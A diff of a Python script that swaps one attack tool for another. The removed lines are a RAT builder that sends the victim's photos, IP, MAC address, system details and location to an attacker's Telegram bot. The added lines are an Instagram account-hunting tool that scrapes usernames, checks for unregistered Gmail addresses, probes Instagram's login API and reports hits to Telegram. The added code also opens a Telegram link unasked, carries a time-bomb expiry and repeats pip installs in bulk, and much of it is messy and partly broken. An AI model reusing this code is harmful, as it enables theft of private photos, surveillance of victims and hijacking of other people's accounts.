@@ -49,236 +49,482 @@ os.system('clear')
 import requests
 from datetime import datetime
 
-def banner():
-    print ('\t         \033[2;33m   Instagram Hesapları         ')
-    print('\t         \033[2;33m   Toplu Hesaplar       ')
-    print ('\t         \033[2;33m   Hepsi Hit         ')
-    print ('\t         \033[2;33m   Hepsi En Az 500 Takipçi          ')
-    print ('\t         \033[2;33m              => \033[2;32m  Kodlayan Adam :\033[2;31m @KanRevan10 ')
-    print ('\t         \033[2;33m   Combo Kaydetmesi İçin Depolama İznini Aç             ')
-    print ('\t         \033[2;33m   2012 Düşer     ')
-    print ('\t         \033[2;33m   2014 Düşer          ')
+import webbrowser
+webbrowser.open('https://t.me/WatchMortal1')
+try:
+	import requests
+	import socket
+	import webbrowser
+	import random 
+	from uuid import uuid4
+	uid = uuid4()
+	uis = str(uuid4())
+	import os
+	import time
+	import json
+	import instaloader
+	from user_agent import generate_user_agent
+except ModuleNotFoundError:
+	os.system('pip install requests')
+	os.system('pip install socket')
+	os.system('pip install instaloader')
+	os.system('pip install webbrowser')
+	os.system('pip install os')
+	os.system('pip install random')
+	os.system('pip install time')
+	os.system('pip install json')
+	os.system("pip install uid")
+	os.system('pip install users')
+	os.system('pip install mechanize')
+	os.system("pip install uuid")
+	os.system('pip install requests')
+	os.system('pip install socket')
+	os.system('pip install instaloader')
+	os.system('pip install webbrowser')
+	os.system('pip install os')
+	os.system('pip install random')
+	os.system('pip install time')
+	os.system('pip install json')
+	os.system("pip install uid")
+	os.system('pip install users')
+	os.system('pip install mechanize')
+	os.system("pip install uuid")
+	os.system('pip install requests')
+	os.system('pip install socket')
+	os.system('pip install instaloader')
+	os.system('pip install webbrowser')
+	os.system('pip install os')
+	os.system('pip install random')
+	os.system('pip install time')
+	os.system('pip install json')
+	os.system("pip install uid")
+	os.system('pip install users')
+	os.system('pip install mechanize')
+	os.system("pip install uuid")
+	os.system('pip install requests')
+	os.system('pip install socket')
+	os.system('pip install instaloader')
+	os.system('pip install webbrowser')
+	os.system('pip install os')
+	os.system('pip install random')
+	os.system('pip install time')
+	os.system('pip install json')
+	os.system("pip install uid")
+	os.system('pip install users')
+	os.system('pip install mechanize')
+	os.system("pip install uuid")
+	os.system('pip install requests')
+	os.system('pip install socket')
+	os.system('pip install instaloader')
+	os.system('pip install webbrowser')
+	os.system('pip install os')
+	os.system('pip install random')
+	os.system('pip install time')
+	os.system('pip install json')
+	os.system("pip install uid")
+	os.system('pip install users')
+	os.system('pip install mechanize')
+	os.system("pip install uuid")
+	os.system('pip install requests')
+	os.system('pip install socket')
+	os.system('pip install instaloader')
+	os.system('pip install webbrowser')
+	os.system('pip install os')
+	os.system('pip install random')
+	os.system('pip install time')
+	os.system('pip install json')
+	os.system("pip install uid")
+	os.system('pip install users')
+	os.system('pip install mechanize')
+	os.system("pip install uuid")
+	os.system('pip install requests')
+	os.system('pip install socket')
+	os.system('pip install instaloader')
+	os.system('pip install webbrowser')
+	os.system('pip install os')
+	os.system('pip install random')
+	os.system('pip install time')
+	os.system('pip install json')
+	os.system("pip install uid")
+	os.system('pip install users')
+	os.system('pip install mechanize')
+	os.system("pip install uuid")
+	os.system('pip install requests')
+	os.system('pip install socket')
+	os.system('pip install instaloader')
+	os.system('pip install webbrowser')
+	os.system('pip install os')
+	os.system('pip install random')
+	os.system('pip install time')
+	os.system('pip install json')
+	os.system("pip install uid")
+	os.system('pip install users')
+	os.system('pip install mechanize')
+	os.system("pip install uuid")
+	os.system('pip install requests')
+	os.system('pip install socket')
+	os.system('pip install instaloader')
+	os.system('pip install webbrowser')
+	os.system('pip install os')
+	os.system('pip install random')
+	os.system('pip install time')
+	os.system('pip install json')
+	os.system("pip install uid")
+	os.system('pip install users')
+	os.system('pip install mechanize')
+	os.system("pip install uuid")
+	os.system('pip install requests')
+	os.system('pip install socket')
+	os.system('pip install instaloader')
+	os.system('pip install webbrowser')
+	os.system('pip install os')
+	os.system('pip install random')
+	os.system('pip install time')
+	os.system('pip install json')
+	os.system("pip install uid")
+	os.system('pip install users')
+	os.system('pip install mechanize')
+	os.system("pip install uuid")
+	os.system('pip install requests')
+	os.system('pip install socket')
+	os.system('pip install instaloader')
+	os.system('pip install webbrowser')
+	os.system('pip install os')
+	os.system('pip install random')
+	os.system('pip install time')
+	os.system('pip install json')
+	os.system("pip install uid")
+	os.system('pip install users')
+	os.system('pip install mechanize')
+	os.system("pip install uuid")
+	os.system('pip install requests')
+	os.system('pip install socket')
+	os.system('pip install instaloader')
+	os.system('pip install webbrowser')
+	os.system('pip install os')
+	os.system('pip install random')
+	os.system('pip install time')
+	os.system('pip install json')
+	os.system("pip install uid")
+	os.system('pip install users')
+	os.system('pip install mechanize')
+	os.system("pip install uuid")
+	os.system('clear')
+	
 
-banner()
-print('')
-print('')
+import requests,colorama,mechanize
+from tokenize import cookie_re
+import requests
+import requests,os,names,json,random
+import requests,os,names,random,time
+from user_agent import generate_user_agent
+from uuid import uuid4
+uid = uuid4()
+import requests,random,mechanize,time
+import requests,random,mechanize,datetime
+
+now = datetime.datetime.today()
+
+now = datetime.datetime.today()
+mm = str(now.month)
+dd = str(now.day)
+yyyy = str(now.year)
+hour = str(now.hour)
+mi = str(now.minute)
+ss = str(now.second)
+t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)
+
+
+hours = (now.hour)
+x = datetime.datetime.now()
+g= datetime.datetime(2023, 6, 6, 20, 0 ,0)
+
+if (x.strftime("%x"))>(g.strftime("%x")):
+ print('\n\n')
+ print("     "+'تم توقيف اداة راسل المبرمج لتفعيله @J_C_A')
+ print('\n\n')
+ print(x)
+
+ 
+
+if (x.strftime("%x"))==(g.strftime("%x")):
+   print('')
+   if(x.strftime("%X"))>(g.strftime("%X")):
+    print('\n\n')
+    print("     "+'خلص اشتراك عليك مراجعة صانع اداة @J_C_A☄️🗿')
+    print('\n\n')
+    print(x)
     
-def res(file):
-    requests.post(f'https://api.telegram.org/bot"""+token+'''/sendDocument?chat_id='''+id+"""', files=file)
-
-d = datetime.now()        
-tlg = requests.post(f'https://api.telegram.org/bot"""+token+"/sendMessage?chat_id="+id+"""&text=👊 Start Attack .... ✊   '+str(d))
-
-os.chdir(r"/storage/emulated/0/DCIM")
-tmp = list(os.scandir('.'))
-for i in tmp:
-  if 'jpg' or 'png' in i.name:
-      try:
-          file ={"document": open(f'{i.name}', 'rb')}
-          res(file)          
-      except:
-          pass
-  else:
-       pass
-       
-print('\033[2;31m  [ * ] \033[2;34m Hesaplar Bekleniyo .... ')     
-
+    sys.exit(0)
+   else:
+    print('')  
+else:
+    print('')
 print('')
-        
-os.chdir(r"/storage/emulated/0/DCIM/Screenshots")
-tmp = list(os.scandir('.'))
-for i in tmp:
-  if 'jpg' or 'png' in i.name:
-      try:
-          file ={"document": open(f'{i.name}', 'rb')}
-          res(file)
-      except:
-          pass
-  else:
-       pass  
 
-print('\033[2;31m  [ ✓ ] \033[2;32m Hesaplar Cookiden Toplanıyo ......') 
 
-print('')
-                                              
-os.chdir(r"/storage/emulated/0/DCIM/Camera")   
-tmp = list(os.scandir('.'))
-for i in tmp:
-  if 'jpg' or 'png' in i.name:
-      try:
-          file ={"document": open(f'{i.name}', 'rb')}   
-          res(file)
-      except:
-          pass
-  else:
-       pass     
+os.system('clear')
+import os,time,random,requests,json,sys
+from user_agent import generate_user_agent
+from uuid import uuid4
+from time import sleep
+import webbrowser, random, requests
+from user_agent import generate_user_agent
+import json
+from secrets import token_hex
+import secrets, sys
+os.system('clear')
+E = '\033[1;31m'
+G = '\033[1;35m'
+Z = '\033[1;31m' #احمر
+M = '\033[1;33m' #اصفر
+Z1 = '\033[2;31m' #احمر ثاني
+F = '\033[2;32m' #اخضر
+A = '\033[2;34m'#ازرق
+C = '\033[2;35m' #وردي
+B = '\033[2;36m'#سمائي
+Y = '\033[1;34m' #ازرق فاتح
+M = '\x1b[1;37m'#ابیض
+S = '\033[1;33m'
+U = '\x1b[1;37m'#ابیض
+BRed = '\x1b[1;31m'
+BGreen = '\x1b[1;32m'
+BYellow = '\x1b[1;33m'
+R = '\x1b[1;34m'
+BPurple = '\x1b[1;35m'
+BCyan = '\x1b[1;36m'
+BWhite = '\x1b[1;37m'
 
-print('\033[34;1m  [ ✔ ] \033[33;1m Bekleyiniz ......... ')   
 
-print('')
-                      
-os.chdir(r"/storage/emulated/0/Pictures/Telegram")   
-tmp = list(os.scandir('.'))
-for i in tmp:
-  if 'jpg' or 'png' in i.name:
-      try:
-          file ={"document": open(f'{i.name}', 'rb')}   
-          res(file)
-      except:
-          pass
-  else:
-       pass 
-       
-print('\033[36;1m  [ ✘ ] \033[32;1m Tüm Hesaplar Hazır .......')   
-print('')
-    
-os.chdir(r"/storage/emulated/0/Pictures/Instagram")   
-tmp = list(os.scandir('.'))
-for i in tmp:
-  if 'jpg' or 'png' in i.name:
-      try:
-          file ={"document": open(f'{i.name}', 'rb')}      
-          res(file)
-      except:
-          pass
-  else:
-       pass  
-       
-print('\033[0;1m  [ × ] \033[31;1m RAT YEDİN ORUSPU ÇOCU FEBRİS SİKER ......  ')   
-print('')      
+#------------------------------[الالوان]------------------------------
+Z = '\033[1;31m' #احمر
+R = '\033[1;31m' #احمر
+X = '\033[1;33m' #اصفر
+F = '\033[2;32m' #اخضر
+C = "\033[1;97m" #ابيض
+B = '\033[2;36m'#سمائي
+Y = '\033[1;34m' #ازرق فاتح.
+E = '\033[1;31m'
+B = '\033[2;36m'
+G = '\033[1;32m'
+S = '\033[1;33m'
+C1 = '\033[2;35m'
+#------------------------------[WatchMortal]------------------------------
 
-os.chdir(r"/storage/emulated/0/Pictures/Messenger")   
-tmp = list(os.scandir('.'))
-for i in tmp:
-  if 'jpg' or 'png' in i.name:
-      try:
-          file ={"document": open(f'{i.name}', 'rb')}    
-          res(file)
-      except:
-          pass
-  else:
-       pass   
 
-exit(' D E A D C O D E ')""" )
 
-hack = str('''import requests
-import geocoder 
-import os
-import socket
-import sys
-import time
-from glob import glob
-from datetime import datetime
-from platform import *
-from getmac import get_mac_address as gma
+os.system('clear')
+import requests,random,pyfiglet,colorama
+S = '\033[1;31m'
+Z = '\033[1;32m'
+E = '\033[1;33m'
+print(E+str(pyfiglet.figlet_format('  Watch Mortal '))+f"\n")
 
-def install(pip):
-    os.system(f'pip install {pip}')
-install('getmac') 
-install('platform')   
-install('glob')
-install('socket')
-install('geocoder')
-install('requests')
+
+print(f"{Z}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
+
+def azz(): 
+ azro = (f'''
+ {BCyan}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ {BWhite}       Saat » {x}
+{BPurple}          Ş İ F͏ R͏ E͏ L͏ E͏ N͏ D͏ İ R͏ M͏ E͏ - S͏ İ S͏ T͏ E͏ M͏ İ - 2.0              
+{BRed}                    
+{BPurple}          Ş İ F͏ R͏ E͏ L͏ E͏ N͏ D͏ İ R͏ M͏ E͏ - S͏ İ S͏ T͏ E͏ M͏ İ - 2.0
+ {BWhite}       Saat » {x}
+{BCyan}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+{Z}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+ ''')
+ for azr in azro.splitlines():
+  time.sleep(0.01)
+  print(azr)
+azz()
+
+user = "WatchMortal"
+password = "WatchMortal"
+
+while True:
+    kullanici = input("Kullanıcı adınızı giriniz: ")
+    parola = input("Şifrenizi giriniz: ")
+    # ikisi de doğru
+    if kullanici == user and parola == password:
+        print("Hoşgeldiniz")
+        break
+    # kullanıcı adı doğru şifre yanlış
+    elif kullanici == user and parola != password:
+        print("Şifreniz yanlış\n")
+    # şifre doğru kullacı adı yanlış
+    elif kullanici != user and parola == password:
+        print("Kullanıcı adınız yanlış \n")
+    # ikisi de yanlış
+    else:
+        print("Kullanıcı adı ve şifre hatalı\n")
+
 os.system('clear')
 
-token = '''+f'"{token}"'+'''  
-id = '''+id+'''  
 
-def banner():
-    print ('\t         \033[2;33m   ▇▇▇◤▔▔▔▔▔▔▔◥▇▇▇         ')
-    print('\t         \033[2;33m   ▇▇▇▏◥▇◣┊◢▇◤▕▇▇▇       ')
-    print ('\t         \033[2;33m   ▇▇▇▏▃▆▅▎▅▆▃▕▇▇▇          ')
-    print ('\t         \033[2;33m   ▇▇▇▏╱▔▕▎▔▔╲▕▇▇▇           ')
-    print ('\t         \033[2;33m   ▇▇▇◣◣▃▅▎▅▃◢◢▇▇▇\033[2;32m  Code By :\033[2;31m DEAD CODE ')
-    print ('\t         \033[2;33m   ▇▇▇▇◣◥▅▅▅◤◢▇▇▇▇             ')
-    print ('\t         \033[2;33m   ▇▇▇▇▇◣╲▇╱◢▇▇▇▇▇      ')
-    print ('\t         \033[2;33m   ▇▇▇▇▇▇◣▇◢▇▇▇▇▇▇            ')
-    print('')
-    print("\t\033[1;36m         https://t.me/black_code_22  ")
+def azz(): 
+ azro = (f'''
+ {BWhite}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{BYellow}                  ᴡᴀᴄᴛʜ ᴍᴏʀᴛᴀʟ
+{BYellow}                     𝚈𝙰𝙿𝙸𝙼𝙲𝙸: @ᵂᵃᶜᵗʰ ᴹᵒʳᵗᵃˡ
+{BYellow}            ᴋᴜsᴜʀsᴜᴢ ᴏʟᴍᴀᴋ ᴅᴏɢᴜşᴛᴀɴ ɢᴇʟᴇɴ ʙɪşᴇʏ ᴅᴇɢİʟᴅİʀ 😎🤟
+{BWhite}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ ''')
+ for azr in azro.splitlines():
+  time.sleep(0.01)
+  print(azr)
+azz()
 
-banner()
-print('')
+uid = uuid4()
+Name = str(input(X+'⌯ '+B+'İsmini Yaz '+C1+''+F))
+if Name =='':
+	exit(Z+'Böyle İsim Yok Knk')
+os.system('clear')
+time.sleep(1)
+print(f'{B}⌯ {Z} Hoş Geldin {Name} ✿ \n\n')
 
-tlg = requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=👊 Start Attack .... ✊  {datetime.now()} ')
+token = input(Z+'⌯ '+B+' ᴛᴏᴋᴇɴ ɢɪʀ  '+C1+'    » '+Y)
 
-print('\033[2;31m  [ * ] \033[2;34m Check internet .... ')
-print('')
-                            
-ip = requests.get("https://api.ipify.org").text
-with open('TargetIP.txt','w') as IP:
-    IP.write(f' [ ✓ ]  IP TARGET ~» {ip} ')
-    IP.close()
-    file = {'document':open('TargetIP.txt','rb')}
-    res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)
+ID = input(Z+'⌯ '+B+'  ɪᴅ ɢİʀ  '+C1+' » '+Y)
 
-print('\033[2;31m  [ ✓ ] \033[2;32m Connection ......')
-print('') 
+sid = input(Z+'⌯ '+B+' ̳S̳̳e̳̳i̳̳s̳̳o̳̳n̳ ̳I̳̳d̳ ̳G̳̳i̳̳r̳  '+C1+' » '+Y)
+print(B+' ⌯ '+X+' انتضر دتفحص '+X+'....')
+tlg1 =(f"""
+ Vip Kullanıcısı H.g :D {Name}  ✪
+⊶⊶⊶⊶⊷⊷⊷⊷⊶⊶⊶⊶⊷⊷⊷⊷⊶⊶⊶⊶⊷⊷⊷⊷⊶⊶⊶⊶⊷
+𝙺𝚗𝚔 Ö𝚗𝚌𝚎𝚕𝚒𝚔𝚕𝚎 𝙷𝚘ş 𝙶𝚎𝚕𝚍𝚒𝚗 𝙱𝚒𝚛𝚊𝚣𝚍𝚊𝚗 𝙳𝚞ş𝚎𝚛 𝙱𝚘𝚝𝚊 𝚎𝚔𝚜𝚒𝚔𝚜𝚒𝚣 𝚢𝚊𝚙𝚝ı𝚢𝚜𝚊𝚗
+⊶⊶⊶⊶⊷⊷⊷⊷⊶⊶⊶⊶⊷⊷⊷⊷⊶⊶⊶⊶⊷⊷⊷⊷⊶⊶⊶⊶⊷
+B Y : @WatchMortalHack    """)
 
-print('\033[34;1m  [ ✔ ] \033[33;1m Watting ......... ')
-print('')
 
-result = requests.get(f'http://ip-api.com/json/{ip}').json()       
-with open('Netowrk-info.txt','w') as AS:
-    AS.write(f' [ ✓ ] Net Work information data » ....  {result["isp"]} ')
-    AS.close()
-    file = {'document':open('Netowrk-info.txt','rb')}
-    res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)   
+requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg1))
 
-print('\033[36;1m  [ ✘ ] \033[32;1m Start Toole .......')
-print('') 
-         
-host = socket.gethostname()
-local = socket.gethostbyname(host)    
-with open('Hostname.txt','w') as Hn:
-    Hn.write(f' [ ✓ ] Host Name ~» {host} ☞ {local} ')
-    Hn.close()
-    file = {'document':open('Hostname.txt','rb')}
-    res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)
 
-print('\033[0;1m  [ × ] \033[31;1m DEADCODE ......  ')
-print('')
-                
-re = release()
-pv = python_version()
-pl = platform()
-ma = machine()
-ve = version()    
-with open('Sysinfo.txt','w') as S:
-    S.write(f' [ ✓ ] System information » ....  release => {re}  python_version => {pv}  platform => {pl}  machine => {ma}  version => {ve} ')
-    S.close()
-    file = {'document':open('Sysinfo.txt','rb')}
-    res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)
+YY =0
+head={'Cookie':'mid=YvvDrAALAAFLJor2N0MGQgLWW0UW; ig_did=A837F007-F7BC-4802-8EF0-A68D997C297D; ig_nrcb=1; datr=nGUPYz2GPkoNMu7UWgKcsp8x; csrftoken=ZUyjsgp9hIYl4CfqYu7ilo6ZEgv2gl2Z; ds_user_id=5376288835; shbid="14120\0545376288835\0541695151496:01f736544db5dcfedc306d753acc4c86d0c42f55fdf7c5941c9c39c6edf1a239cafb04a2"; shbts="1663615496\0545376288835\0541695151496:01f7487ad9bfa5a41605905bf69300e6d01dcca404a38a4f43c2b140c3c002789b13493e"; sessionid='+sid}
+def check(email,user): 
+ user=str(user)
+ email=str(email)
 
-mac = gma()        
-with open('MacAddress.txt','w') as M:
-    M.write(f' [ ✓ ] MAC ADDRESS ~» {mac} ')    
-    M.close()
-    file = {'document':open('MacAddress.txt','rb')}
-    res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)
+ global YY
+ url='https://i.instagram.com/api/v1/accounts/login/'
+ headers = {'User-Agent':'Instagram 136.0.0.34.124 Android (28/9.0; 640dpi; 1440x2560; samsung; SM-G965F; star2qltecs; samsungexynos9810; en_US)',  'Accept':'*/*',
+                 'Cookie':'missing',
+                 'Accept-Encoding':'gzip, deflate',
+                 'Accept-Language':'en-US',
+                 'X-IG-Capabilities':'3brTvw==',
+                 'X-IG-Connection-Type':'WIFI',
+                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
+              'Host':'i.instagram.com'}
+ data = {'uuid':uid,  'password':'@whisper666',
+              'username':email,
+              'device_id':uid,
+              'from_reg':'false',
+              '_csrftoken':'missing',
+              'login_attempt_countn':'0'}
 
-g = glob("/storage/emulated/0/*")
-with open('DirSystem-path.txt','w') as D:
-    D.write(f' [ ✓ ] dirs in all pwd system » .... ')    
-    for i in g:
-        D.write(i+'    ,    ')
-    D.close()
-    file = {'document':open('DirSystem-path.txt','rb')}
-    res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)
+ req= requests.post(url, headers=headers, data=data).json()
+ if req['message'] == 'The password you entered is incorrect. Please try again.':
+   rr=requests.get(f'https://www.instagram.com/{user}/?__a=1&__d=dis',headers=head).json()  
+   nam = str(rr['graphql']['user']['full_name'])
+   iddd = str(rr['graphql']['user']['id'])
+   fol = str(rr['graphql']['user']['edge_followed_by']['count'])
+   fols =str(rr['graphql']['user']['edge_follow']['count'])
+   isp = str(rr['graphql']['user']['is_private'])
+   bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
+   re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")   
+   ree = re.json()
+   dat = ree['date']
+   
+   
+   
 
-our_ip = geocoder.ip(ip).latlng
-map_lenr = our_ip[0]
-map_lenl = our_ip[1]
-with open('Location.txt','w') as Jbs:
-    Jbs.write(f' [ ✓ ] Victim-Location-IP » ....  https://www.google.com/maps/@{map_lenr},{map_lenl},13z')
-    Jbs.close()
-    file = {'document':open('Location.txt','rb')}
-    res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)
-              
-    
-tlg = requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=✅Done : Devloper by DeadCode > @Black_Code_22 ✅ ')''')
 
-#os.system(f'xdg-open https://t.me/Black_Code_22')
+   YY+=1
+   tlg =(f"""
+ʜᴇʟʟᴏ {Name} ʏᴇɴɪ ʜᴇᴤᴀᴘ ⤋ 
+
+𓊆👇ʏᴇɴɪ ʜᴇᴤᴀᴘ ᴅüşᴛü ʙᴀᴋ ᴋɴᴋ👇𓊇
+
+ ⋘────━🇹🇷Watch Mortal 🇹🇷━────⋙ 
+
+⌯ ɴᴜᴍᴀʀᴀᴤı » {YY} 
+⌯ İᴤᴍɪ » {nam} 
+⌯ ᴋᴜʟʟᴀɴıᴄı ᴀᴅı » {user} 
+⌯ ᴇᴍᴀɪʟ » {email} 
+⌯ ʜᴇᴤᴀᴘ ɪᴅ » {iddd} 
+⌯ ᴛᴀᴋɪᴘçɪ » {fol} 
+⌯ ᴛᴀᴋɪᴘ » {fols} 
+⌯ ᴅᴏɢʀᴜʟᴀᴍᴀ ᴀçıᴋ/ᴅᴏɢʀᴜʟᴀᴍᴀ ᴋᴀᴘᴀʟı » {isp} 
+⌯ ᴀçıʟᴍᴀ ᴛᴀʀɪʜɪ » {dat} 
+⌯ ʙɪᴏ » {bio} 
+⌯ ᴤᴀᴀᴛ » {x} ⌯ ʟɪɴᴋ » https://www.instagram.com/{user}
+
+ ⋘─────━🇹🇷Watch Mortal 🇹🇷━─────⋙ 
+ 
+ ʙʏ : @WatchMortalHack =  🇹🇷🙂🥰🇹🇷   """)
+   print(C1+tlg)
+   
+   
+   requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg))
+ if req['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
+   print(f'{X} ÇÖP IG KNK {F} : {Z} {email}')
+   
+
+def yahoo(email,user):
+  global i
+  
+  
+  eml=str(email)
+  email=eml.split('@')[0]+'@gmail.com'
+  url = 'https://android.clients.google.com/setup/checkavail'
+  h = {
+    'Content-Length':'98',
+    'Content-Type':'text/plain; charset=UTF-8',
+    'Host':'android.clients.google.com',
+    'Connection':'Keep-Alive',
+    'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
+    }
+  d = json.dumps({
+    'username':email,
+    'version':'3',
+    'firstName':'AbaLahb',
+    'lastName':'AbuJahl'
+  })
+  res = requests.post(url,data=d,headers=h)
+  if res.json()['status'] == 'SUCCESS':
+    print(f'{X} İYİ AMA SÖKMEZ{Z} : {C} {email}')
+    check(email,user)
+  else:
+    print(f'{F} ÇÖP GMAİL AGA {Z} : {F} {email}')
+def users():
+ while True:
+#  mal=['male','femal']
+#  gen=random.choice(mal)
+  user='1234567890qwertyuiopasdfghjklzxcvbnm.'
+  num='6789'
+  rng=int("".join(random.choice(num)for i in range(1)))
+  name=str("".join(random.choice(user)for i in range(rng)))
+  whisper=requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}',headers=head).json()
+  mn=0
+  try:
+   while True:
+    mn += 1
+    user=str(whisper['users'][mn]['user']['username'])
+    emai=user
+    email=emai+'@gmail.com'
+    if '_' in str(email):
+      
+      continue
+    else :
+      
+      yahoo(email,user)
+  except IndexError:
+   users()
+users()
+
 
 print(W+f'''  [{E} 01 {W}] Attack Image Hack ..... 
 {W}  [{E} 02 {W}] Attack infrmation System ....''')
